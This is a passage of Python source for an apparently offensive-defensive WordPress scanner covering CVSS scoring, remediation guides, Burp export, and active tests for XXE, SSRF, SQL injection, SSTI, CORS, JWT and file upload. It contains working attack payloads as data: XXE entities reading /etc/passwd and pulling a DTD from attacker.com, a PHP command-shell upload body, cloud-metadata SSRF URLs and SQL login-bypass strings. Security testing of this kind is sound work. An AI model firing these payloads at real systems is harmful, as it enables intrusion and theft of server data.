        except FileNotFoundError:
            self.log(f"[!] Previous scan file not found: {self.compare_with}", Fore.RED)
        except Exception as e:
            self.log(f"[!] Comparison failed: {e}", Fore.RED)

    # FEATURE 8: CVSS Scoring
    def calculate_cvss_score(self, vuln_type: str, details: Dict) -> Dict:
        """Calculate CVSS v3.1 score for vulnerability"""
        if not self.cvss_scoring:
            return {}

        # Simplified CVSS scoring based on vulnerability type
        cvss_data = {
            'version': '3.1',
            'vector_string': '',
            'base_score': 0.0,
            'severity': 'None'
        }

        # Common vulnerability mappings to CVSS scores
        vuln_scores = {
            'SQL Injection': {'score': 9.8, 'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'},
            'Remote Code Execution': {'score': 10.0, 'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H'},
            'XML-RPC Enabled': {'score': 5.3, 'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N'},
            'User Enumeration': {'score': 5.3, 'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N'},
            'Directory Listing': {'score': 5.3, 'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N'},
            'Exposed Backup': {'score': 8.6, 'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N'},
            'Exposed API Key': {'score': 9.1, 'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N'},
            'Missing Security Headers': {'score': 4.3, 'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N'},
            'Outdated WordPress': {'score': 7.5, 'vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N'},
        }

        # Find matching vulnerability type
        for key in vuln_scores:
            if key.lower() in vuln_type.lower():
                cvss_data = {
                    'version': '3.1',
                    'vector_string': vuln_scores[key]['vector'],
                    'base_score': vuln_scores[key]['score'],
                    'severity': self._get_cvss_severity(vuln_scores[key]['score'])
                }
                break

        return cvss_data

    def _get_cvss_severity(self, score: float) -> str:
        """Map CVSS score to severity rating"""
        if score == 0.0:
            return 'None'
        elif score < 4.0:
            return 'Low'
        elif score < 7.0:
            return 'Medium'
        elif score < 9.0:
            return 'High'
        else:
            return 'Critical'

    def add_cvss_to_vulnerabilities(self) -> None:
        """Add CVSS scores to all vulnerabilities"""
        if not self.cvss_scoring:
            return

        for vuln in self.vulnerabilities:
            cvss = self.calculate_cvss_score(vuln['title'], vuln)
            if cvss:
                vuln['cvss'] = cvss

        self.log("[+] CVSS scores calculated for all vulnerabilities", Fore.GREEN)

    # FEATURE 9: Enhanced Remediation Guide
    def generate_enhanced_remediation(self) -> None:
        """Generate detailed remediation guide with code snippets"""
        try:
            output_path = self.output_dir if self.output_dir else "."
            host = urlparse(self.target_url).netloc.replace(":", "_")
            remediation_file = os.path.join(output_path, f"waduh_{host}_remediation.md")

            with open(remediation_file, 'w', encoding='utf-8') as f:
                f.write(f"# WordPress Security Remediation Guide\n\n")
                f.write(f"**Target:** {self.target_url}\n")
                f.write(f"**Scan Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"**WordPress Version:** {self.wp_version or 'Unknown'}\n\n")
                f.write("---\n\n")

                if not self.vulnerabilities and not self.security_issues:
                    f.write("## ✅ No Critical Issues Found\n\n")
                    f.write("Your WordPress installation appears to be secure. However, continue monitoring for new vulnerabilities.\n\n")
                    return

                # Priority issues first
                if self.vulnerabilities:
                    f.write("## 🔴 Critical Vulnerabilities\n\n")

                    # Sort by severity
                    severity_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
                    sorted_vulns = sorted(self.vulnerabilities,
                                        key=lambda x: severity_order.get(x.get('severity', 'low'), 99))

                    for i, vuln in enumerate(sorted_vulns, 1):
                        severity = vuln.get('severity', 'unknown').upper()
                        f.write(f"### {i}. {vuln['title']} [{severity}]\n\n")
                        f.write(f"**Description:** {vuln['description']}\n\n")

                        # Add CVSS if available
                        if 'cvss' in vuln:
                            f.write(f"**CVSS Score:** {vuln['cvss']['base_score']} ({vuln['cvss']['severity']})\n")
                            f.write(f"**CVSS Vector:** `{vuln['cvss']['vector_string']}`\n\n")

                        # Provide specific remediation
                        remediation = self._get_remediation_steps(vuln['title'])
                        f.write(f"**Remediation:**\n{remediation}\n\n")
                        f.write("---\n\n")

                # Security misconfigurations
                if self.security_issues:
                    f.write("## ⚠️ Security Misconfigurations\n\n")
                    for i, issue in enumerate(self.security_issues, 1):
                        f.write(f"### {i}. {issue['title']}\n\n")
                        f.write(f"{issue['description']}\n\n")
                        remediation = self._get_remediation_steps(issue['title'])
                        f.write(f"**Fix:**\n{remediation}\n\n")
                        f.write("---\n\n")

                # General hardening
                f.write("## 🛡️ General WordPress Hardening\n\n")
                f.write("### 1. Update Everything\n")
                f.write("```bash\n")
                f.write("wp core update\n")
                f.write("wp plugin update --all\n")
                f.write("wp theme update --all\n")
                f.write("```\n\n")

                f.write("### 2. Add Security Headers\n")
                f.write("Add to .htaccess:\n")
                f.write("```apache\n")
                f.write("# Security Headers\n")
                f.write('Header set X-Content-Type-Options "nosniff"\n')
                f.write('Header set X-Frame-Options "SAMEORIGIN"\n')
                f.write('Header set X-XSS-Protection "1; mode=block"\n')
                f.write('Header set Referrer-Policy "strict-origin-when-cross-origin"\n')
                f.write("```\n\n")

                f.write("### 3. Disable XML-RPC (if not needed)\n")
                f.write("Add to functions.php:\n")
                f.write("```php\n")
                f.write("add_filter('xmlrpc_enabled', '__return_false');\n")
                f.write("```\n\n")

                f.write("### 4. Limit Login Attempts\n")
                f.write("Install: [Limit Login Attempts Reloaded](https://wordpress.org/plugins/limit-login-attempts-reloaded/)\n\n")

                f.write("### 5. Enable Two-Factor Authentication\n")
                f.write("Install: [Two Factor Authentication](https://wordpress.org/plugins/two-factor/)\n\n")

            self.log(f"[+] Enhanced remediation guide: {remediation_file}", Fore.GREEN + Style.BRIGHT)

        except Exception as e:
            self.log(f"[!] Failed to generate remediation guide: {e}", Fore.RED)

    def _get_remediation_steps(self, vuln_title: str) -> str:
        """Get specific remediation steps for vulnerability type"""
        remediations = {
            'XML-RPC': """1. Disable XML-RPC in wp-config.php:
   ```php
   add_filter('xmlrpc_enabled', '__return_false');
   ```
2. Or block it via .htaccess:
   ```apache
   <Files xmlrpc.php>
   Order Deny,Allow
   Deny from all
   </Files>
   ```""",

            'User Enumeration': """1. Install a security plugin like Wordfence
2. Add to functions.php:
   ```php
   if (!is_admin()) {
       if (preg_match('/author=([0-9]*)/i', $_SERVER['QUERY_STRING'])) {
           wp_redirect(home_url(), 301);
           exit;
       }
   }
   ```""",

            'Directory Listing': """Add to .htaccess:
   ```apache
   Options -Indexes
   ```""",

            'Version Disclosure': """1. Add to functions.php:
   ```php
   remove_action('wp_head', 'wp_generator');
   ```
2. Remove version from RSS:
   ```php
   add_filter('the_generator', '__return_empty_string');
   ```""",

            'Backup': """1. Delete all backup files from web-accessible directories
2. Move backups outside web root
3. Add to .htaccess:
   ```apache
   <FilesMatch "\\.(sql|zip|tar|gz|bak)$">
   Order allow,deny
   Deny from all
   </FilesMatch>
   ```""",

            'Security Headers': """Add to .htaccess or Nginx config:
   ```apache
   Header set X-Content-Type-Options "nosniff"
   Header set X-Frame-Options "SAMEORIGIN"
   Header set X-XSS-Protection "1; mode=block"
   Header set Content-Security-Policy "default-src 'self'"
   ```""",

            'API Key': """1. Immediately rotate exposed API keys
2. Use environment variables:
   ```php
   define('API_KEY', getenv('MY_API_KEY'));
   ```
3. Never commit keys to version control""",

            'CORS': """Configure proper CORS headers in .htaccess:
   ```apache
   Header set Access-Control-Allow-Origin "https://yourdomain.com"
   Header set Access-Control-Allow-Credentials "true"
   ```"""
        }

        # Find matching remediation
        for key, remediation in remediations.items():
            if key.lower() in vuln_title.lower():
                return remediation

        return "1. Review the vulnerability details\n2. Apply security patches\n3. Update affected components\n4. Implement security best practices"

    # FEATURE 10: Burp Suite Export
    def export_burp_suite(self) -> None:
        """Export findings as Burp Suite XML session file"""
        if not self.export_burp:
            return

        try:
            output_path = self.output_dir if self.output_dir else "."
            host = urlparse(self.target_url).netloc.replace(":", "_")
            burp_file = os.path.join(output_path, f"waduh_{host}_burp.xml")

            self.log("[*] Generating Burp Suite XML export...", Fore.BLUE)

            # Build XML
            xml_lines = ['<?xml version="1.0"?>', '<items burpVersion="2023.1">']

            # Add target scope
            parsed = urlparse(self.target_url)
            xml_lines.append('  <target>')
            xml_lines.append(f'    <host>{parsed.netloc}</host>')
            xml_lines.append(f'    <protocol>{parsed.scheme}</protocol>')
            xml_lines.append('  </target>')

            # Add vulnerabilities as issues
            for vuln in self.vulnerabilities:
                xml_lines.append('  <issue>')
                xml_lines.append(f'    <serialNumber>{hash(vuln["title"]) % 1000000}</serialNumber>')
                xml_lines.append(f'    <type>5243392</type>')  # Generic issue type
                xml_lines.append(f'    <name>{self._xml_escape(vuln["title"])}</name>')
                xml_lines.append(f'    <host>{parsed.netloc}</host>')
                xml_lines.append(f'    <path>/</path>')
                xml_lines.append(f'    <location>{self._xml_escape(self.target_url)}</location>')

                severity_map = {'critical': 'High', 'high': 'High', 'medium': 'Medium', 'low': 'Low'}
                severity = severity_map.get(vuln.get('severity', 'medium'), 'Medium')
                xml_lines.append(f'    <severity>{severity}</severity>')
                xml_lines.append(f'    <confidence>Certain</confidence>')

                issue_detail = f"{vuln['description']}"
                if 'cvss' in vuln:
                    issue_detail += f"\n\nCVSS Score: {vuln['cvss']['base_score']} ({vuln['cvss']['severity']})"

                xml_lines.append(f'    <issueDetail>{self._xml_escape(issue_detail)}</issueDetail>')
                xml_lines.append('  </issue>')

            xml_lines.append('</items>')

            # Write file
            with open(burp_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(xml_lines))

            self.log(f"    [+] Burp Suite XML exported: {burp_file}", Fore.GREEN)
            self.log(f"    [+] Import in Burp: Target > Site map > Import", Fore.CYAN)

        except Exception as e:
            self.log(f"    [!] Failed to export Burp Suite XML: {e}", Fore.RED)

    def _xml_escape(self, text: str) -> str:
        """Escape XML special characters"""
        if not text:
            return ""
        text = str(text)
        text = text.replace('&', '&amp;')
        text = text.replace('<', '&lt;')
        text = text.replace('>', '&gt;')
        text = text.replace('"', '&quot;')
        text = text.replace("'", '&apos;')
        return text

    # ============================================================================
    # Additional v3.0 Features (Stubs for testing/basic implementation)
    # ============================================================================

    def test_cors_misconfiguration(self) -> None:
        """Test for CORS misconfigurations"""
        if not self.scan_cors:
            return

        self.log("[*] Testing CORS configuration...", Fore.BLUE)

        try:
            headers_with_origin = self.headers.copy()
            headers_with_origin['Origin'] = 'https://evil.com'

            r = requests.get(
                self.target_url,
                headers=headers_with_origin,
                verify=self.verify_ssl,
                timeout=(5, 20)
            )

            if r.status_code == 200:
                cors_header = r.headers.get('Access-Control-Allow-Origin', '')
                credentials_header = r.headers.get('Access-Control-Allow-Credentials', '')

                if cors_header == '*':
                    self.add_vulnerability(
                        "CORS Misconfiguration - Wildcard Origin",
                        "Access-Control-Allow-Origin is set to * which allows any domain",
                        "medium"
                    )
                    self.log("    [!] CORS allows wildcard origin (*)", Fore.RED)
                elif cors_header == 'https://evil.com':
                    self.add_vulnerability(
                        "CORS Misconfiguration - Reflected Origin",
                        "Server reflects any origin in Access-Control-Allow-Origin",
                        "high"
                    )
                    self.log("    [!] CORS reflects arbitrary origins", Fore.RED)

                if credentials_header.lower() == 'true' and cors_header:
                    self.log("    [!] CORS allows credentials with dynamic origin", Fore.RED)
                    self.add_vulnerability(
                        "CORS Misconfiguration - Credentials with Dynamic Origin",
                        "Access-Control-Allow-Credentials is true with dynamic origin",
                        "high"
                    )
                else:
                    self.log("    [+] No obvious CORS misconfiguration", Fore.GREEN)

        except Exception as e:
            self.log(f"    [!] CORS test failed: {e}", Fore.YELLOW)

    def analyze_cookies(self) -> None:
        """Analyze cookie security settings"""
        if not self.scan_cookies:
            return

        self.log("[*] Analyzing cookie security...", Fore.BLUE)

        try:
            r = self.make_request(self.target_url)
            if not r:
                return

            cookies = r.cookies
            if not cookies:
                self.log("    [+] No cookies set", Fore.GREEN)
                return

            for cookie in cookies:
                issues = []

                if not cookie.secure:
                    issues.append("missing Secure flag")

                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append("missing HttpOnly flag")

                if not cookie.has_nonstandard_attr('SameSite'):
                    issues.append("missing SameSite attribute")

                if issues:
                    self.log(f"    [!] Cookie '{cookie.name}': {', '.join(issues)}", Fore.YELLOW)
                    self.add_security_issue(
                        f"Insecure Cookie: {cookie.name}",
                        f"Cookie has security issues: {', '.join(issues)}"
                    )
                else:
                    self.log(f"    [+] Cookie '{cookie.name}' is secure", Fore.GREEN)

        except Exception as e:
            self.log(f"    [!] Cookie analysis failed: {e}", Fore.YELLOW)

    def analyze_ssl_tls(self) -> None:
        """Analyze SSL/TLS configuration"""
        if not self.scan_ssl:
            return

        self.log("[*] Analyzing SSL/TLS configuration...", Fore.BLUE)

        try:
            parsed = urlparse(self.target_url)
            if parsed.scheme != 'https':
                self.log("    [!] Target is not using HTTPS", Fore.RED)
                self.add_vulnerability(
                    "No HTTPS",
                    "Website is not using HTTPS encryption",
                    "high"
                )
                return

            hostname = parsed.netloc.split(':')[0]
            port = 443

            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()

                    self.log(f"    [+] TLS Version: {version}", Fore.GREEN)
                    self.log(f"    [+] Cipher: {cipher[0]}", Fore.GREEN)

                    # Check certificate expiry
                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_until_expiry = (not_after - datetime.now()).days

                    if days_until_expiry < 0:
                        self.add_vulnerability(
                            "Expired SSL Certificate",
                            f"Certificate expired {abs(days_until_expiry)} days ago",
                            "critical"
                        )
                        self.log(f"    [!] Certificate EXPIRED {abs(days_until_expiry)} days ago", Fore.RED)
                    elif days_until_expiry < 30:
                        self.add_security_issue(
                            "SSL Certificate Expiring Soon",
                            f"Certificate expires in {days_until_expiry} days"
                        )
                        self.log(f"    [!] Certificate expires in {days_until_expiry} days", Fore.YELLOW)
                    else:
                        self.log(f"    [+] Certificate valid for {days_until_expiry} days", Fore.GREEN)

        except ssl.SSLError as e:
            self.log(f"    [!] SSL Error: {e}", Fore.RED)
            self.add_vulnerability(
                "SSL/TLS Configuration Error",
                f"SSL Error: {str(e)}",
                "high"
            )
        except Exception as e:
            self.log(f"    [!] SSL analysis failed: {e}", Fore.YELLOW)

    # ============================================================================
    # PRECISION ENHANCEMENT - ADVANCED VULNERABILITY DETECTION
    # ============================================================================

    def test_graphql_security(self) -> None:
        """Comprehensive GraphQL endpoint security testing"""
        if not self.scan_graphql:
            return

        self.log("[*] Testing GraphQL endpoint security...", Fore.BLUE)

        # Common GraphQL paths
        graphql_paths = [
            '/graphql', '/graphiql', '/api/graphql', '/v1/graphql',
            '/query', '/gql', '/api/query', '/wp-json/graphql'
        ]

        for path in graphql_paths:
            url = urljoin(self.target_url, path)

            try:
                # Test 1: Introspection query
                introspection_query = {
                    "query": """
                    {
                        __schema {
                            types {
                                name
                                fields {
                                    name
                                }
                            }
                        }
                    }
                    """
                }

                r = self.make_request(url, method="POST", json=introspection_query)

                if r and r.status_code == 200:
                    try:
                        data = r.json()
                        if '__schema' in str(data) or 'types' in str(data):
                            self.log(f"    [!] GraphQL endpoint found: {url}", Fore.RED)
                            self.add_vulnerability(
                                "GraphQL Introspection Enabled",
                                f"GraphQL introspection is enabled at {url}, exposing complete schema",
                                "medium",
                                confidence="high",
                                evidence=f"Introspection response: {str(data)[:200]}"
                            )

                            # Test 2: Field suggestion (typo-based enumeration)
                            suggestion_query = {"query": "{ __typename_invalid }"}
                            r2 = self.make_request(url, method="POST", json=suggestion_query)
                            if r2 and 'suggestions' in r2.text.lower():
                                self.log(f"    [!] GraphQL field suggestions enabled", Fore.YELLOW)
                                self.add_security_issue(
                                    "GraphQL Field Suggestions",
                                    f"Field suggestions enabled at {url}, aids in enumeration"
                                )

                            # Test 3: Depth limit
                            deep_query = {
                                "query": "{ " + "user { " * 50 + "id" + " }" * 50 + " }"
                            }
                            r3 = self.make_request(url, method="POST", json=deep_query, timeout=(5, 10))
                            if r3 and r3.status_code == 200:
                                self.add_vulnerability(
                                    "GraphQL No Depth Limit",
                                    f"No depth limiting detected at {url}, vulnerable to DoS",
                                    "medium",
                                    confidence="high"
                                )

                            # Test 4: Batch query abuse
                            batch_query = {
                                "query": """
                                query {
                                    q1: __typename
                                    q2: __typename
                                    q3: __typename
                                }
                                """ * 10
                            }
                            r4 = self.make_request(url, method="POST", json=batch_query)
                            if r4 and r4.status_code == 200:
                                self.log(f"    [!] GraphQL batch queries allowed", Fore.YELLOW)

                    except json.JSONDecodeError:
                        pass

                # Test 5: GET method support (less secure)
                r_get = self.make_request(f"{url}?query={{__typename}}")
                if r_get and r_get.status_code == 200 and '__typename' in r_get.text:
                    self.add_security_issue(
                        "GraphQL GET Queries Enabled",
                        f"GraphQL accepts GET requests at {url}, enables CSRF"
                    )

            except Exception:
                pass

        self.log("    [+] GraphQL security testing complete", Fore.GREEN)

    def test_xxe_vulnerabilities(self) -> None:
        """Test for XML External Entity (XXE) vulnerabilities"""
        self.log("[*] Testing for XXE vulnerabilities...", Fore.BLUE)

        # XXE payloads
        xxe_payloads = [
            # Classic XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>''',

            # XXE with parameter entities
            '''<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<data>&send;</data>''',

            # XXE via SVG
            '''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<text>&xxe;</text>
</svg>''',
        ]

        # Test endpoints
        test_paths = [
            '/xmlrpc.php',
            '/wp-admin/admin-ajax.php',
            '/wp-json/wp/v2/posts',
        ]

        for path in test_paths:
            url = urljoin(self.target_url, path)

            for payload in xxe_payloads:
                try:
                    headers = self.headers.copy()
                    headers['Content-Type'] = 'application/xml'

                    r = self.make_request(url, method="POST", data=payload, headers=headers, timeout=(5, 10))

                    if r:
                        # Check for XXE indicators
                        xxe_indicators = [
                            'root:', 'daemon:', 'bin:', '/bin/bash',  # /etc/passwd content
                            'SYSTEM', 'ENTITY', '<!DOCTYPE',  # XML processing
                        ]

                        if any(indicator in r.text for indicator in xxe_indicators):
                            self.log(f"    [!] Possible XXE at {url}", Fore.RED)
                            self.add_vulnerability(
                                "XML External Entity (XXE) Vulnerability",
                                f"Potential XXE vulnerability detected at {url}",
                                "critical",
                                confidence="medium",
                                evidence=f"Response contains: {r.text[:200]}",
                                exploit_available=True
                            )

                except Exception:
                    pass

        self.log("    [+] XXE testing complete", Fore.GREEN)

    def test_file_upload_vulnerabilities(self) -> None:
        """Test for file upload vulnerabilities"""
        self.log("[*] Testing file upload security...", Fore.BLUE)

        # Find upload forms
        if not self.homepage_html:
            return

        # Look for file upload inputs
        upload_forms = re.findall(r'<form[^>]+action="([^"]*)"[^>]*>.*?<input[^>]+type=["\']file["\'][^>]*>.*?</form>',
                                 self.homepage_html, re.DOTALL | re.I)

        if upload_forms:
            self.log(f"    [*] Found {len(upload_forms)} file upload forms", Fore.CYAN)

            # Test upload restrictions
            test_files = {
                # Double extension
                'test.php.jpg': b'<?php phpinfo(); ?>',
                # Null byte injection
                'test.php%00.jpg': b'<?php system($_GET["cmd"]); ?>',
                # Case manipulation
                'test.PhP': b'<?php echo "vulnerable"; ?>',
                # SVG with XSS
                'test.svg': b'<svg onload="alert(1)">',
                # .htaccess
                '.htaccess': b'AddType application/x-httpd-php .jpg',
            }

            self.add_security_issue(
                "File Upload Found",
                f"File upload functionality detected. Manual testing recommended for: "
                f"extension bypass, MIME type validation, size limits, path traversal"
            )

        # Check /wp-content/uploads permissions
        upload_url = urljoin(self.target_url, '/wp-content/uploads/')
        r = self.make_request(upload_url)

        if r and r.status_code == 200:
            if 'Index of' in r.text or '<title>Index' in r.text:
                self.add_vulnerability(
                    "Uploads Directory Listing",
                    "WordPress uploads directory is browsable",
                    "medium",
                    confidence="high"
                )

    def test_ssrf_vulnerabilities(self) -> None:
        """Test for Server-Side Request Forgery (SSRF)"""
        self.log("[*] Testing for SSRF vulnerabilities...", Fore.BLUE)

        # SSRF test payloads
        ssrf_payloads = [
            'http://localhost',
            'http://127.0.0.1',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal',  # GCP metadata
            'file:///etc/passwd',
            'gopher://127.0.0.1:25',
        ]

        # Test in common parameters
        test_urls = [
            f'{self.target_url}?url=',
            f'{self.target_url}?uri=',
            f'{self.target_url}?redirect=',
            f'{self.target_url}?link=',
            f'{self.target_url}?file=',
            f'{self.target_url}?path=',
        ]

        ssrf_found = False
        for base_url in test_urls:
            for payload in ssrf_payloads:
                try:
                    test_url = base_url + requests.utils.quote(payload)
                    r = self.make_request(test_url, timeout=(3, 8))

                    if r:
                        # Check for SSRF indicators
                        if r.status_code == 200:
                            # Look for internal service responses
                            ssrf_indicators = [
                                'ami-id', 'instance-id',  # AWS metadata
                                'root:', 'daemon:',  # File read
                                '220 ', '250 ',  # SMTP
                                'localhost',
                            ]

                            if any(indicator in r.text.lower() for indicator in ssrf_indicators):
                                self.add_vulnerability(
                                    "Server-Side Request Forgery (SSRF)",
                                    f"Possible SSRF vulnerability in parameter at {test_url}",
                                    "critical",
                                    confidence="medium",
                                    evidence=f"Response: {r.text[:200]}",
                                    exploit_available=True
                                )
                                ssrf_found = True
                                break

                except Exception:
                    pass

            if ssrf_found:
                break

        if not ssrf_found:
            self.log("    [+] No obvious SSRF vulnerabilities detected", Fore.GREEN)

    def test_auth_bypass(self) -> None:
        """Test for authentication bypass vulnerabilities"""
        self.log("[*] Testing authentication bypass techniques...", Fore.BLUE)

        # Test 1: SQL injection in login
        login_url = urljoin(self.target_url, '/wp-login.php')

        sql_payloads = [
            "admin' OR '1'='1' --",
            "admin' OR 1=1#",
            "' OR '1'='1' /*",
            "admin'--",
        ]

        for payload in sql_payloads:
            try:
                data = {
                    'log': payload,
                    'pwd': 'anything',
                    'wp-submit': 'Log In'
                }

                r = self.make_request(login_url, method="POST", data=data, allow_redirects=False)

                if r and r.status_code in [301, 302, 303]:
                    # Check if redirected to admin
                    location = r.headers.get('Location', '')
                    if 'wp-admin' in location:
                        self.add_vulnerability(
                            "SQL Injection in Login",
                            f"Possible SQL injection bypass in login form: payload={payload}",
                            "critical",
                            confidence="high",
                            exploit_available=True
                        )
                        break

            except Exception:
                pass

        # Test 2: Password reset token prediction
        # Test 3: JWT token manipulation (if JWT is used)
        # Test 4: Session fixation

        self.log("    [+] Auth bypass testing complete", Fore.GREEN)

    def test_advanced_sqli(self) -> None:
        """Advanced SQL injection testing with multiple techniques"""
        self.log("[*] Advanced SQL injection testing...", Fore.BLUE)

        # Test parameters
        test_params = ['id', 'page_id', 'p', 'cat', 's', 'author', 'tag', 'year', 'monthnum']

        # Advanced SQLi payloads
        sqli_payloads = {
            # Time-based blind
            "time_based": [
                "1' AND SLEEP(5)--",
                "1) AND SLEEP(5)--",
                "1)) AND SLEEP(5)--",
                "1' AND BENCHMARK(5000000,MD5('test'))--",
            ],
            # Boolean-based blind
            "boolean": [
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1) AND (1=1",
                "1) AND (1=2",
            ],
            # Error-based
            "error": [
                "1' AND extractvalue(1,concat(0x7e,version()))--",
                "1' AND updatexml(1,concat(0x7e,version()),1)--",
                "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
            ],
            # Union-based
            "union": [
                "1' UNION SELECT NULL,NULL,NULL--",
                "1' UNION SELECT user(),database(),version()--",
            ]
        }

        sqli_found = []

        for param in test_params:
            for technique, payloads in sqli_payloads.items():
                for payload in payloads:
                    try:
                        test_url = f"{self.target_url}?{param}={requests.utils.quote(payload)}"

                        import time as time_module
                        start = time_module.time()
                        r = self.make_request(test_url, timeout=(10, 20))
                        elapsed = time_module.time() - start

                        if r:
                            # Time-based detection
                            if technique == "time_based" and elapsed >= 5:
                                sqli_found.append({
                                    'param': param,
                                    'technique': 'Time-based Blind SQLi',
                                    'payload': payload,
                                    'confidence': 'high'
                                })

                            # Error-based detection
                            elif technique == "error" and any(err in r.text.lower() for err in [
                                'mysql', 'sql syntax', 'sqlstate', 'ora-', 'postgresql', 'sqlite', 'mssql'
                            ]):
                                sqli_found.append({
                                    'param': param,
                                    'technique': 'Error-based SQLi',
                                    'payload': payload,
                                    'confidence': 'high'
                                })

                            # Union-based detection
                            elif technique == "union" and r.status_code == 200:
                                # Check for SQL version strings
                                if re.search(r'\d+\.\d+\.\d+', r.text):
                                    sqli_found.append({
                                        'param': param,
                                        'technique': 'Union-based SQLi',
                                        'payload': payload,
                                        'confidence': 'medium'
                                    })

                    except Exception:
                        pass

        if sqli_found:
            for finding in sqli_found:
                self.log(f"    [!] {finding['technique']} in parameter '{finding['param']}'", Fore.RED)
                self.add_vulnerability(
                    f"Advanced SQL Injection - {finding['technique']}",
                    f"Parameter '{finding['param']}' vulnerable to {finding['technique']}",
                    "critical",
                    confidence=finding['confidence'],
                    evidence=f"Payload: {finding['payload']}",
                    exploit_available=True
                )
        else:
            self.log("    [+] No advanced SQL injection detected", Fore.GREEN)

    def test_csrf_protection(self) -> None:
        """Analyze CSRF token implementation"""
        self.log("[*] Analyzing CSRF protection...", Fore.BLUE)

        # Check for CSRF tokens in forms
        if self.homepage_html:
            # WordPress nonce detection
            nonces = re.findall(r'name=["\'](_wpnonce|_ajax_nonce|security)["\'][^>]+value=["\']([^"\']+)["\']',
                              self.homepage_html)

            if nonces:
                self.log(f"    [+] Found {len(nonces)} CSRF tokens", Fore.GREEN)

                # Check token entropy
                for name, value in nonces[:5]:
                    if len(value) < 10:
                        self.add_security_issue(
                            "Weak CSRF Token",
                            f"CSRF token '{name}' appears to have low entropy: {value}"
                        )
            else:
                self.log("    [!] No CSRF tokens found in forms", Fore.YELLOW)
                self.add_security_issue(
                    "Missing CSRF Protection",
                    "No CSRF tokens detected in HTML forms"
                )

        # Check CORS + Credentials combination (CSRF risk)
        try:
            headers_with_origin = self.headers.copy()
            headers_with_origin['Origin'] = 'https://evil.com'

            r = requests.get(
                self.target_url,
                headers=headers_with_origin,
                verify=self.verify_ssl,
                timeout=(5, 10)
            )

            cors_origin = r.headers.get('Access-Control-Allow-Origin', '')
            cors_creds = r.headers.get('Access-Control-Allow-Credentials', '')

            if cors_origin and cors_creds.lower() == 'true':
                self.add_vulnerability(
                    "CSRF via CORS Misconfiguration",
                    "CORS allows credentials with dynamic origin, enabling CSRF attacks",
                    "high",
                    confidence="high"
                )

        except Exception:
            pass

    def test_jwt_security(self) -> None:
        """Test JWT token security"""
        self.log("[*] Testing JWT security...", Fore.BLUE)

        # Look for JWT tokens in responses
        if self.homepage_html:
            # JWT pattern: xxx.yyy.zzz
            jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            jwts = re.findall(jwt_pattern, self.homepage_html)

            if jwts:
                self.log(f"    [!] Found {len(jwts)} JWT tokens", Fore.YELLOW)

                for jwt_token in jwts[:3]:  # Analyze first 3
                    try:
                        # Decode header and payload
                        parts = jwt_token.split('.')
                        if len(parts) == 3:
                            # Decode header
                            header = base64.urlsafe_b64decode(parts[0] + '==').decode('utf-8')
                            payload = base64.urlsafe_b64decode(parts[1] + '==').decode('utf-8')

                            header_data = json.loads(header)
                            payload_data = json.loads(payload)

                            # Check for weak algorithms
                            alg = header_data.get('alg', '')
                            if alg == 'none':
                                self.add_vulnerability(
                                    "JWT None Algorithm",
                                    "JWT uses 'none' algorithm, allowing signature bypass",
                                    "critical",
                                    confidence="high",
                                    exploit_available=True
                                )
                            elif alg in ['HS256', 'HS384', 'HS512']:
                                self.log(f"    [*] JWT uses HMAC algorithm: {alg}", Fore.CYAN)
                                self.add_security_issue(
                                    "JWT HMAC Algorithm",
                                    f"JWT uses symmetric algorithm {alg}, vulnerable to key confusion attacks"
                                )

                            # Check expiration
                            exp = payload_data.get('exp')
                            if not exp:
                                self.add_security_issue(
                                    "JWT No Expiration",
                                    "JWT token does not have expiration claim"
                                )

                    except Exception:
                        pass

    def test_ssti_vulnerabilities(self) -> None:
        """Test for Server-Side Template Injection"""
        self.log("[*] Testing for SSTI vulnerabilities...", Fore.BLUE)

        # SSTI payloads for various engines
        ssti_payloads = {
            'Jinja2': ['{{7*7}}', '{{config}}', '{{request}}'],
            'Twig': ['{{7*7}}', '{{_self}}'],
            'Smarty': ['{$smarty.version}', '{7*7}'],
            'Freemarker': ['${7*7}', '#{7*7}'],
            'Velocity': ['#set($x=7*7)$x'],
        }

        # Test in search parameter
        test_params = ['s', 'q', 'search', 'query', 'name']

        for param in test_params:
            for engine, payloads in ssti_payloads.items():
                for payload in payloads:
                    try:
                        test_url = f"{self.target_url}?{param}={requests.utils.quote(payload)}"
                        r = self.make_request(test_url)

